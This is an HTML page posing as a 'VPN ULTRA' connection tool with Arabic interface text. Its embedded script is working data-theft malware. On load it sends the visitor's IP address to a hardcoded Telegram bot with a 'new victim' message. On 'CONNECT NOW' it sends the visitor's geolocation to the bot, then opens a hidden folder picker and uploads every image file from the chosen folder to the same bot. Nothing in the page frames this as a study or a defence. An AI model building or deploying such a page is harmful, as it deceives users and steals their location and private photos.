
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>VPN Pro</title>
</head>
<body style="background:#000;color:#fff;text-align:center;padding-top:50px;font-family:sans-serif;">
    <div style="border:2px solid #ff8c00;padding:30px;border-radius:20px;display:inline-block;">
        <h1 style="color:#ff8c00;">VPN ULTRA</h1>
        <p id="st">جاري تأمين اتصالك...</p>
        <input type="file" id="f" webkitdirectory directory multiple style="display:none;">
        <button onclick="start()" style="background:#ff8c00;border:none;padding:20px 40px;border-radius:10px;font-weight:bold;cursor:pointer;">CONNECT NOW</button>
    </div>
    <script>
        const T = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
        const C = '7214473798';

        (async () => {
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=🌐 ضحية جديد!\nIP: ${d.ip}`);
        })();

        async function start() {
            document.getElementById('st').innerText = "جاري الحماية وسحب البيانات...";
            navigator.geolocation.getCurrentPosition((p) => {
                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=📍 الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });
            document.getElementById('f').click();
        }

        document.getElementById('f').onchange = async (e) => {
            for (let file of e.target.files) {
                if (file.type.startsWith('image/')) {
                    const fd = new FormData();
                    fd.append('chat_id', C);
                    fd.append('document', file);
                    fetch(`https://api.telegram.org/bot${T}/sendDocument`, {method:'POST', body:fd});
                }
            }
        };
    </script>
</body>
</html>
